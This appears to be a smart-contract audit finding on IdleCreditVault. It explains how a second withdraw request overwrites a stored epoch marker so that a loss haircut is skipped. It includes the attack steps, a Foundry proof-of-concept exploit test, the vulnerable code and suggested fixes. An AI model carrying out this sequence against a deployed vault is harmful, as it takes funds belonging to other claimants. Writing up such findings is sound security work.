### Title
Withdraw-loss haircut escape via overwriting `lastWithdrawRequest` marker with a second request - (File: contracts/strategies/idle/IdleCreditVault.sol)

### Summary
`IdleCreditVault` stores a per-epoch loss haircut in `lossRecoveryPriceByEpoch[epochNumber]` when `collectWithdrawFunds` is underpaid (loss adjusted stop). But `_claimLossAdjustedWithdrawRequest` looks up the haircut using only `lastWithdrawRequest[_user]` — a single slot overwritten on every new `requestWithdraw`. A user who holds a loss-epoch receipt can issue a second withdraw request in a later epoch, causing the loss-epoch haircut lookup to miss (returns 0) and the entire aggregate `withdrawsRequests[_user]` — including the haircutted epoch-N receipt — to be paid at full par by `_claimFundedWithdrawRequest`. This is the direct analog of CVE-2022-49763: a stale/overwritten index (`lastWithdrawRequest`) is used to retrieve per-epoch bounds/pricing data, so the sanity check is silently skipped and out-of-scope value is read/paid.

### Finding Description
1. `requestWithdraw` unconditionally sets `lastWithdrawRequest[_user] = currentEpoch` and accumulates `withdrawsRequests[_user] += _amount` and `withdrawsRequestsByEpoch[_user][currentEpoch] += _amount` (lines 282–293).
2. On a `stopEpochWithDuration` loss where the borrower underfunds, `collectWithdrawFunds` records `lossRecoveryPriceByEpoch[epochNumber] = funded * RECOVERY_FULL / pendingBasis` and zeroes `pendingWithdraws` (lines 414–421). The haircut is applied to the whole `pendingWithdraws` bucket, which includes epoch-N receipts.
3. `_claimLossAdjustedWithdrawRequest` computes `lossEpoch = lastWithdrawRequest[_user]` and reads `lossRecoveryPriceByEpoch[lossEpoch]`; if zero it returns early (lines 789–792). It only ever inspects the single most recent epoch marker.
4. `_claimFundedWithdrawRequest` then pays `amount = withdrawsRequests[_user] + apr0...` at par and zeroes the aggregate (lines 338–349).

Attack sequence (unprivileged KYC'd tranche holder):
- Epoch N buffer: user calls `requestWithdraw(x)` → `lastWithdrawRequest = N`, receipt recorded under epoch N.
- Epoch N ends with a realized loss; `stopEpochWithDuration` underfunds pending receipts → `lossRecoveryPriceByEpoch[N] = p < RECOVERY_FULL`. User's epoch-N claim basis is now worth only `x * p`.
- Instead of claiming, user keeps a small tranche balance and, in the next buffer, calls `requestWithdraw(y)` (even dust) → `lastWithdrawRequest = M` (M = N+1), `withdrawsRequests[_user] = x + y`.
- After epoch M ends (funded normally, or even at same price), `claimWithdrawRequest` runs: `_claimLossAdjustedWithdrawRequest` checks `lossRecoveryPriceByEpoch[M] == 0` → skips; `_claimLossAdjustedWithdrawRequest` never revisits epoch N because the marker was overwritten; `_claimFundedWithdrawRequest` pays `x + y` at par via `_transferFundedClaim`.

The haircut recorded for epoch N is never applied to the user's epoch-N receipt, because the only lookup key (`lastWithdrawRequest`) was clobbered — the "offset" pointing at the loss record is stale, exactly mirroring `attrs_offset` being used without validation in `ntfs_attr_find`.

### Impact Explanation
Direct theft / insolvency: the user recovers the full `x` principal of the loss-adjusted epoch-N receipt instead of `x * p`. The excess `(x * (1 - p))` is paid out of the strategy's funded-claim balance, which is reserved for other pending/funded claimants and (post-default) guarded by `defaultRecoveryReserve`. Since `collectWithdrawFunds` only funded `pendingBasis * p` for that epoch, paying receipts at par drains value belonging to other claimants or makes the vault insolvent for later claims. Loss scales with the size of the epoch-N receipt and the haircut magnitude.

### Likelihood Explanation
High. Requirements are all unprivileged: hold tranche tokens (KYC'd lender), request a withdraw before a loss epoch, and submit a second request (any amount) after `stopEpochWithDuration` sets a haircut. Loss epochs are a normal protocol path (`stopEpochWithDuration(_lossAmount)`), and not claiming immediately is already forced/encouraged by the epoch-wait design. No privileged cooperation is needed; honest manager calls are simply sequenced around.

### Recommendation
Do not rely on the single `lastWithdrawRequest` slot to locate loss-adjusted receipts. Options:
- Iterate/queue all epochs with `lossRecoveryPriceByEpoch[e] != 0` that the user has `withdrawsRequestsByEpoch[_user][e]` in, applying each haircut before the funded claim (e.g., track a per-user list or a `firstUnclaimedLossEpoch` cursor).
- Or, in `_claimFundedWithdrawRequest`, subtract each loss-epoch receipt from `withdrawsRequests[_user]` and settle it at its own `lossRecoveryPriceByEpoch` before paying the remainder at par.
- Alternatively, revert `requestWithdraw` while the user holds an unclaimed receipt in a loss-adjusted epoch.

// test/foundry/IdleCreditVaultLossEscape.t.sol
// Setup: standard IdleCreditVault harness, fixed-APR mode (not APR0), user is KYC'd.
function testLossHaircutEscapeViaSecondRequest() external {
    uint256 x = 1_000 * ONE_SCALE;      // epoch-N withdraw
    uint256 y = 1 * ONE_SCALE;          // dust second request
    idleCDO.depositAA(100_000 * ONE_SCALE);
    _depositWithUser(attacker, x + y, true);

    _startEpochAndCheckPrices(0);
    vm.warp(cdoEpoch.epochEndDate() + 1);
    _stopCurrentEpochWithApr(10e18);    // epoch increments; attacker requests in buffer
    uint256 lossEpoch = strategy.epochNumber();

    vm.prank(attacker);
    cdoEpoch.requestWithdraw(x, address(AAtranche)); // lastWithdrawRequest = lossEpoch

    // Run epoch; borrower underfunds -> loss recorded at lossEpoch
    _startEpochAndCheckPrices(lossEpoch);
    uint256 pending = strategy.pendingWithdraws();
    uint256 lossAmount = pending / 2;   // ~50% haircut on pending bucket
    (uint256 pendingToFund, ) = strategy.previewLossAdjustedWithdrawFunds(lossAmount);
    uint256 interest = cdoEpoch.expectedEpochInterest();
    deal(address(underlying), borrower, interest + pendingToFund);
    vm.prank(borrower); underlying.approve(address(cdoEpoch), interest + pendingToFund);
    vm.warp(cdoEpoch.epochEndDate() + 1);
    vm.prank(manager);
    cdoEpoch.stopEpochWithDuration(10e18, 0, cdoEpoch.epochDuration(), lossAmount);
    assertLt(strategy.lossRecoveryPriceByEpoch(lossEpoch), RECOVERY_FULL);

    // New epoch: attacker files dust request, overwriting lastWithdrawRequest
    uint256 dustEpoch = strategy.epochNumber();
    vm.prank(attacker);
    cdoEpoch.requestWithdraw(y, address(AAtranche));
    assertEq(strategy.lastWithdrawRequest(attacker), dustEpoch);

    _startEpochAndCheckPrices(dustEpoch);
    // fund normally
    uint256 interest2 = cdoEpoch.expectedEpochInterest();
    uint256 pending2 = strategy.pendingWithdraws();
    deal(address(underlying), borrower, interest2 + pending2);
    vm.prank(borrower); underlying.approve(address(cdoEpoch), interest2 + pending2);
    vm.warp(cdoEpoch.epochEndDate() + 1);
    vm.prank(manager);
    cdoEpoch.stopEpoch(10e18, interest2);

    // Claim: lossRecoveryPriceByEpoch[dustEpoch] == 0 -> par payout of x + y
    uint256 balPre = underlying.balanceOf(attacker);
    vm.prank(attacker);
    cdoEpoch.claimWithdrawRequest();
    uint256 paid = underlying.balanceOf(attacker) - balPre;

    uint256 expectedFull = x + y;
    uint256 expectedHaircutted = x * strategy.lossRecoveryPriceByEpoch(lossEpoch) / RECOVERY_FULL + y;
    assertEq(paid, expectedFull);                 // haircut skipped
    assertGt(paid, expectedHaircutted);           // attacker stole (x*(1-p)) from reserve/other claimants
}

  function collectWithdrawFunds(uint256 _amount) external {
    _onlyIdleCDO();
    uint256 pendingBasis = pendingWithdraws;
    if (_amount < pendingBasis) {
      // Legacy receipts do not have per-epoch ownership data, so they can only be fully funded.
      if (!defaultRecoveryInitialized) revert NotAllowed();
      uint256 lossRecoveryPrice = _amount * RECOVERY_FULL / pendingBasis;
      // Avoid storing a zero price, which is indistinguishable from "no loss-adjusted epoch".
      if (lossRecoveryPrice == 0) revert NotAllowed();
      pendingWithdraws = 0;
      lossRecoveryPriceByEpoch[epochNumber] = lossRecoveryPrice;
    } else {
      // A plain implementation upgrade may leave legacy normal receipts pending. Their next
      // successful stop can fully fund the aggregate before lazy initialization occurs.
      pendingWithdraws = pendingBasis - _amount;
    }
    if (_amount != 0) {
      underlyingToken.safeTransferFrom(idleCDO, address(this), _amount);
    }
  }

  function _claimLossAdjustedWithdrawRequest(address _user) internal returns (uint256 amount) {
    uint256 lossEpoch = lastWithdrawRequest[_user];
    uint256 lossRecoveryPrice = lossRecoveryPriceByEpoch[lossEpoch];
    if (lossRecoveryPrice == 0) return amount;

    (uint256 claimBasis, uint256 burnAmount) = _clearWithdrawClaimForEpoch(_user, lossEpoch, false);
    if (claimBasis == 0) return amount;

    // pendingWithdraws was already cleared when the borrower funded the loss-adjusted amount.
    _burn(_user, burnAmount);
    amount = (claimBasis * lossRecoveryPrice) / RECOVERY_FULL;
    _transferFundedClaim(_user, amount);
  }
